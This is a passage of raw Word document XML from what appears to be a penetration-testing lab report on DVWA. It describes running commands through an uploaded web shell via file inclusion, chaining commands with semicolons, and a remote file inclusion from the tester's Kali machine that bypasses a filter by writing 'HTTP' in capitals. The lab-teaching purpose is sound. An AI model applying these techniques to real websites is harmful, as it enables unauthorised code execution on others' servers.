      <w:r w:rsidR="00976823" w:rsidRPr="00B73721">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D68CAF" w14:textId="4D8CF126" w:rsidR="00976823" w:rsidRDefault="00976823" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="330C26F5" w14:textId="3B29B88B" w:rsidR="00976823" w:rsidRDefault="00976823" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A99758D" wp14:editId="3E1EC8B7">
            <wp:extent cx="6760847" cy="30861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a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6761763" cy="3086518"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA70097" w14:textId="79EADACE" w:rsidR="00976823" w:rsidRPr="00E34B94" w:rsidRDefault="00976823" w:rsidP="00976823">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.7</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Upload Error Message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71D37173" w14:textId="247301E3" w:rsidR="00976823" w:rsidRDefault="00D47F0D" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The result does not look very interesting but to use the web</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>shell, a parameter with a command to be executed needs to be passed to the web</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>shell. In File inclusion</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> however, the code from the included backdoor file is integrated with the file including it</w:t>
      </w:r>
      <w:r w:rsidR="001F09E1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, so the cmd parameter </w:t>
      </w:r>
      <w:r w:rsidR="00E74506">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>must</w:t>
      </w:r>
      <w:r w:rsidR="001F09E1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> be passed as if it were being sent to the including page</w:t>
      </w:r>
      <w:r w:rsidR="007E1E1B">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidR="00E74506">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8052EE" w14:textId="77777777" w:rsidR="00E3170E" w:rsidRDefault="00E3170E" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="134FF8E3" w14:textId="29264057" w:rsidR="00B73721" w:rsidRDefault="00B73721" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3B7F1D73" wp14:editId="1756FCCA">
            <wp:extent cx="6705600" cy="3620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6882981" cy="3716549"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B52EDE2" w14:textId="2F92D0C4" w:rsidR="00102114" w:rsidRDefault="00102114" w:rsidP="00102114">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:bookmarkStart w:id="16" w:name="_Hlk67416308"/>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Passing id Command to CMD Parameter</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="2A4AC3E5" w14:textId="54EE6ABE" w:rsidR="005A0F07" w:rsidRDefault="00102114" w:rsidP="00E1017C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="097969B5" wp14:editId="4CDAA490">
            <wp:extent cx="68072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6820242" cy="3769583"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4947E4" w14:textId="2B65C008" w:rsidR="00102114" w:rsidRDefault="00102114" w:rsidP="00102114">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Passing </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>PWD</w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Command to CMD Parameter </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D9300D" w14:textId="08F4FE3D" w:rsidR="00E74506" w:rsidRDefault="00E74506" w:rsidP="00E74506">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">It is also possible to chain multiple commands in a single call using the semicolon(;) as a </w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:t>separator</w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33AFAC6F" w14:textId="77777777" w:rsidR="00E3170E" w:rsidRPr="00E74506" w:rsidRDefault="00E3170E" w:rsidP="00E74506"/>
    <w:p w14:paraId="5981F0A9" w14:textId="57205EA9" w:rsidR="00102114" w:rsidRDefault="007D0171" w:rsidP="00102114">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B5299F4" wp14:editId="44EBCD65">
            <wp:extent cx="6981190" cy="3571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7009452" cy="3586335"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B42E3DD" w14:textId="19B1C9F5" w:rsidR="007D0171" w:rsidRDefault="007D0171" w:rsidP="007D0171">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Chaining Multiple CMD Commands in </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00D91485">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>single call</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18715C57" w14:textId="4FF02BA1" w:rsidR="004D6526" w:rsidRDefault="004D6526" w:rsidP="007D0171"/>
    <w:p w14:paraId="4BC697E7" w14:textId="1CBE5FA6" w:rsidR="004D6526" w:rsidRDefault="004D6526" w:rsidP="007D0171"/>
    <w:p w14:paraId="4E6817E7" w14:textId="0A69E664" w:rsidR="004D6526" w:rsidRDefault="004D6526" w:rsidP="007D0171"/>
    <w:p w14:paraId="1BB84C44" w14:textId="0852A08D" w:rsidR="004D6526" w:rsidRDefault="004D6526" w:rsidP="007D0171"/>
    <w:p w14:paraId="5899F49D" w14:textId="2D3B90C5" w:rsidR="008C173A" w:rsidRPr="00ED0E81" w:rsidRDefault="008C173A" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Remote File Inclusion Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="254A14B0" w14:textId="51AE3E10" w:rsidR="008C173A" w:rsidRPr="00FF06BD" w:rsidRDefault="008C173A" w:rsidP="008C173A">
      <w:r w:rsidRPr="00420339">
        <w:t xml:space="preserve">During the exploitation phase, Adelaja </w:t>
      </w:r>
      <w:r>
        <w:t>will attempt to exploit an RFI vulnerability within the DVWA website. Remote File Inclusion is an attack technique that exploits the file inclusion mechanism when the application permits the inclusion of files from other servers. This can result in the application being tricked into running a script from a remote server under the control of an attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26085BC3" w14:textId="77777777" w:rsidR="008C173A" w:rsidRDefault="008C173A" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="29B507AE" w14:textId="77EF86E8" w:rsidR="008C173A" w:rsidRPr="008D0AB1" w:rsidRDefault="00ED0E81" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="008C173A" w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>1.Checking For Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D794BA" w14:textId="3DDA4418" w:rsidR="007421CD" w:rsidRDefault="008C173A" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Remote File Inclusion works </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>similarly</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to the Local File Inclusion. The exception being that a full URL path is used rather than a relative path of a file. For testing purposes, </w:t>
      </w:r>
      <w:r w:rsidR="007421CD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
      <w:r w:rsidR="00331503">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00331503" w:rsidRPr="007421CD">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>index.html</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkStart w:id="17" w:name="_Hlk67423413"/>
      <w:r w:rsidR="007421CD" w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 3.</w:t>
      </w:r>
      <w:r w:rsidR="007421CD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="007421CD" w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="007421CD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="17"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">hosted on </w:t>
      </w:r>
      <w:r w:rsidR="00331503">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Adelaja’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Kali Machine </w:t>
      </w:r>
      <w:r w:rsidR="00950563">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">will be </w:t>
      </w:r>
      <w:r w:rsidR="00331503">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>accessed by including it on the File Inclusion page.</w:t>
      </w:r>
      <w:r w:rsidR="001D03F4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E7A647" w14:textId="6F592A7D" w:rsidR="007421CD" w:rsidRDefault="00331503" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007421CD">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Note that in a real Penetration Test, the file to be accessed would be stored somewhere with a real IP Address or Domain Name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ABFE8A2" w14:textId="77777777" w:rsidR="00907059" w:rsidRPr="007421CD" w:rsidRDefault="00907059" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56740E78" w14:textId="0D15B3F6" w:rsidR="007421CD" w:rsidRDefault="007421CD" w:rsidP="008C173A">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14A59FCA" wp14:editId="4C798AC8">
            <wp:extent cx="6532245" cy="4810125"/>
            <wp:effectExtent l="0" t="0" r="1905"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612027" cy="4868874"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD32B22" w14:textId="2FABA7CE" w:rsidR="007421CD" w:rsidRDefault="007421CD" w:rsidP="007421CD">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Location of Index.html on Remote Kali Machine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70F1A4A0" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="639D47D5" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D2DE997" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31853269" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3684AB7D" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B0E2D4E" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="475CD064" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54F2DF51" w14:textId="77777777" w:rsidR="00907059" w:rsidRDefault="00907059" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="100FCA7C" w14:textId="77777777" w:rsidR="00840C6A" w:rsidRDefault="00840C6A" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B5E5F9C" w14:textId="6DCDED26" w:rsidR="00907059" w:rsidRDefault="001D03F4" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">The index.html page hosted on Adelaja’s machine </w:t>
      </w:r>
      <w:r w:rsidR="007421CD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">is located at </w:t>
      </w:r>
      <w:hyperlink r:id="rId29" w:history="1">
        <w:r w:rsidR="00907059" w:rsidRPr="001E50D2">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:i/>
          </w:rPr>
          <w:t>http://10.0.2.15/index.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00907059">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00907059">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">and can </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>now be included by entering th</w:t>
      </w:r>
      <w:r w:rsidR="00907059">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">is URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidR="00907059">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>s a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter on the DVWA File Inclusion page</w:t>
      </w:r>
      <w:r w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 3.</w:t>
      </w:r>
      <w:r w:rsidR="007421CD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0FC9E1" w14:textId="5E9592AC" w:rsidR="007421CD" w:rsidRPr="00907059" w:rsidRDefault="007421CD" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:i/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00907059">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">Note that the security level on the page is set to </w:t>
      </w:r>
      <w:r w:rsidR="00907059" w:rsidRPr="00907059">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">medium, and the page is filtering any additional http commands, changing “http” to “HTTP” </w:t>
      </w:r>
      <w:r w:rsidR="00907059">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">bypasses this filter </w:t>
      </w:r>
      <w:r w:rsidR="00907059" w:rsidRPr="00907059">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>as shown in [Figure 3.2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4699BA" w14:textId="686B6508" w:rsidR="007421CD" w:rsidRDefault="001D03F4" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222CC942" w14:textId="173FF92B" w:rsidR="00254D5A" w:rsidRDefault="00254D5A" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
